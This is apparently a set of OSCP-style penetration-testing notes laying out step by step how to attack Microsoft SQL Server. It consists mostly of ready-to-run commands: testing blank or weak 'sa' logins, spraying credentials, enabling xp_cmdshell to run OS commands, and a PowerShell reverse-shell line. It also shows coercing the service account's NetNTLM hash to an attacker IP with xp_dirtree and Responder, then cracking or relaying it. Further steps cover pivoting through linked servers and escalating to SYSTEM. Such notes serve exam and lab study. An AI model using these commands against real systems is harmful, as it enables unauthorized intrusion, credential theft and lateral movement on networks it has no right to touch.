# 🔧 MSSQL — Port 1433 (+ 1434/UDP)

> **Microsoft SQL Server** (1433/TCP default instance; 1434/UDP SQL Browser → named-instance ports). Auth modes: **SQL auth** (logins like `sa`), **Windows auth** (domain/local via `-windows-auth`), mixed. On OSCP this is a **code-execution and credential surface**: log in (weak `sa`, reused domain creds, or SQL auth), enable **`xp_cmdshell`** for OS command execution, capture the service account's **NetNTLM hash** via `xp_dirtree`, or hop to other DBs with **linked servers**. Command execution runs as the SQL service account — frequently privileged (often holds `SeImpersonate` → potato → SYSTEM).

Related: [[Credential Attacks]] · [[Windows Privilege Escalation]] · [[Active Directory]] · [[Shells]] · [[SMB]]

---

## 🧠 PORT 1433 → THINK
- **Have any Windows/DB creds?** → `impacket-mssqlclient` and try `enable_xp_cmdshell`.
- **`sa` / blank / weak password** → instant admin → RCE.
- No exec rights → **`xp_dirtree` to your Responder** = steal the service account's NetNTLM hash.
- **Windows auth** works too: domain user via `-windows-auth`.
- Service account often has **SeImpersonate** → potato → SYSTEM ([[Windows Privilege Escalation]]).
- 1434/UDP = SQL Browser (tells you instances/ports).

## ⚡ QUICK TRIAGE (60 sec)
```bash
export IP=10.10.10.10
```

```bash
nmap -p1433 -sV --script ms-sql-info,ms-sql-ntlm-info $IP
```

```bash
# Try the classics
impacket-mssqlclient sa:''@$IP                # blank sa
```

```bash
impacket-mssqlclient sa:'sa'@$IP              # weak sa
```
**Verdict:** login works → try `enable_xp_cmdshell`. Login fails → spray known creds / use `xp_dirtree` hash capture once you can auth.

## ⏱️ ENUMERATE
```bash
# Version/instance info (no creds)
nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $IP
```

```bash
# Authenticated shell into the DB — SQL auth, domain (NTLM), or local Windows account
impacket-mssqlclient sa:'Passw0rd!'@$IP                          # SQL auth
```

```bash
impacket-mssqlclient DOMAIN/jdoe:'Password1'@$IP -windows-auth   # domain creds
```

```bash
impacket-mssqlclient './localuser:pass'@$IP -windows-auth        # local Windows account
```

```bash
# netexec MSSQL — spray + built-in exec + priv check
netexec mssql $IP -u users.txt -p passwords.txt --continue-on-success
```

```bash
netexec mssql $IP -u sa -p 'Passw0rd!' --local-auth -x "whoami"   # run cmd
```

```bash
netexec mssql $IP -u jdoe -p pass -M mssql_priv                   # check/escalate priv

# Inside the client:
#   SELECT @@version;               -- version / OS
#   SELECT system_user;             -- who am I
#   SELECT IS_SRVROLEMEMBER('sysadmin');   -- 1 = admin => xp_cmdshell possible
#   SELECT name FROM sys.databases;
#   EXEC sp_linkedservers;                 -- linked servers -> pivot
#   SELECT name FROM sys.sql_logins;       -- logins
#   SELECT * FROM sys.server_principals;   -- principals/roles
```
**Look for:** `sysadmin`=1 (→ RCE), version (→ known bugs), **linked servers** (execute on them via `openquery`/`EXECUTE AT`), other DBs with data/creds, stored creds.

## 🗡️ EXPLOIT
- 🟢 **Weak/blank `sa` or reused creds → sysadmin → xp_cmdshell RCE.**
- 🟢 **`xp_dirtree` NetNTLM capture** (Responder) → crack or relay → creds/shell.
- 🟡 **`sp_OACreate` / OLE automation** exec when `xp_cmdshell` is disabled but you're sysadmin.
- 🟡 **Linked-server abuse** (`EXECUTE AS`, `openquery`, rpcout) → run on remote SQL, sometimes as sysadmin there.
- 🟡 **Privilege escalation to sysadmin** via `mssql_priv` / impersonation (`EXECUTE AS LOGIN`).
- 🔵 **Read files** (`OPENROWSET BULK`) if `sysadmin`.

**A) xp_cmdshell RCE (need sysadmin):**
```sql
-- inside impacket-mssqlclient
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -e <base64 reverse shell>';   -- get a shell
-- impacket shortcut: type  enable_xp_cmdshell  then  xp_cmdshell whoami
```
**B) NetNTLM capture (no exec rights needed, any auth):**
```bash
# Terminal 1:
sudo responder -I tun0
# In mssqlclient:  EXEC xp_dirtree '\\10.10.14.5\share';   -- or xp_fileexist
# -> Responder prints the SQL service account NetNTLMv2 hash
```

```bash
hashcat -m 5600 sql_hash.txt rockyou.txt                    # crack it
```
**C) Reverse shell (from xp_cmdshell):** host a payload, or use a PowerShell one-liner → [[Shells]].

**After access:** shell as the SQL service account (often `nt service\mssqlserver` or a domain svc):
```powershell
whoami /priv                      # SeImpersonate? -> PrintSpoofer/GodPotato -> SYSTEM
```
Dump SQL logins/hashes, read connection strings in web/app configs → [[Credential Attacks]]; pivot via linked servers to other DB hosts → [[Windows Privilege Escalation]].

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| Blank/weak `sa` | Admin login | `enable_xp_cmdshell` | RCE |
| `IS_SRVROLEMEMBER('sysadmin')=1` | Full control | xp_cmdshell / OLE | shell |
| Not sysadmin | Limited | `xp_dirtree` → Responder | NetNTLM hash |
| SeImpersonate in shell | Token abuse | PrintSpoofer/GodPotato | SYSTEM |
| Linked server listed | Pivot | `EXECUTE AT`/openquery | remote exec |
| Domain creds work `-windows-auth` | AD-integrated | reuse creds elsewhere | lateral |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Login fails | Spray reused creds; try `-windows-auth`; `ms-sql-empty-password` NSE |
| `xp_cmdshell` blocked/disabled | Re-enable via `sp_configure` (if sysadmin); else use `sp_OACreate` OLE; else `xp_dirtree` hash capture |
| Not sysadmin, can't enable | Try `EXECUTE AS LOGIN='sa'`; check `mssql_priv`; fall back to NetNTLM capture |
| Responder gets no hash | Check firewall to your host/port 445; try `xp_fileexist`; verify your tun0 IP |
| Named instance, 1433 closed | Query 1434/UDP (SQL Browser): `nmap -sU -p1434 --script ms-sql-info` for the real port |
| Hash won't crack | Relay it (`ntlmrelayx`) if another host will accept, or move on |

## 📋 REFERENCE — mistakes · don't-miss · stop
**Mistakes:** forgetting **`-windows-auth`** when SQL auth is off but domain creds work · not trying **blank/`sa`/reused** passwords first · overlooking **`xp_dirtree` NetNTLM capture** when you lack exec rights · not checking **`whoami /priv`** after the shell (SeImpersonate is the fast SYSTEM path) · ignoring **linked servers** for lateral movement.
**Reuse:** DB/service creds → [[SMB]], [[WinRM]], [[RDP]], [[LDAP]]; app config files (web/[[HTTP]]) often hold the SQL connection string; captured NetNTLM → crack ([[Credential Attacks]]) or relay to SMB.
**Don't miss:** try blank/`sa`/reused creds and `-windows-auth` · `IS_SRVROLEMEMBER('sysadmin')` · enable + run **xp_cmdshell** · **`xp_dirtree` → Responder** for NetNTLM · `whoami /priv` (SeImpersonate → SYSTEM) · enumerate **linked servers** + other databases · check 1434/UDP for named instances.
**Stop when:** no valid creds after reasonable spraying, SQL auth disabled, no NetNTLM captured, and no domain creds to try `-windows-auth` → exhausted; find creds elsewhere and return. With sysadmin + xp_cmdshell you have RCE — work moves to [[Windows Privilege Escalation]].

## 📇 CHEAT SHEET
```bash
nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $IP
```

```bash
impacket-mssqlclient sa:'pass'@$IP                          # SQL auth
```

```bash
impacket-mssqlclient DOMAIN/user:'pass'@$IP -windows-auth   # domain auth
```

```bash
# in client:
enable_xp_cmdshell
```

```bash
xp_cmdshell whoami
```

```bash
EXEC xp_dirtree '\\<YOUR_IP>\x';      # + sudo responder -I tun0  -> NetNTLM
```

```bash
hashcat -m 5600 hash.txt rockyou.txt  # crack captured hash
```

```bash
netexec mssql $IP -u sa -p 'pass' -x "whoami"
```
**Kill shots:** weak sa → xp_cmdshell → shell → SeImpersonate → SYSTEM · xp_dirtree → NetNTLM → crack/relay.
